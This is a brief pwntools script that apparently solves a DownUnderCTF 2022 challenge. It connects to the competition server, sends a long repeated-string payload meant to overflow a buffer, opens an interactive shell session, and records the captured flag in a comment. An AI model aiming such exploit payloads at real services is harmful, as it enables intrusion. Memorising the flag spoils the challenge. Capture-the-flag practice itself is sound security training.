from pwn import *

HOST = "2022.ductf.dev"
PORT = 30021

io = remote(HOST, PORT)

io.sendline(b"DUCTF"*1024)

io.interactive()
#DUCTF{C_is_n0t_s0_f0r31gn_f0r_incr3d1bl3_pwn3rs}
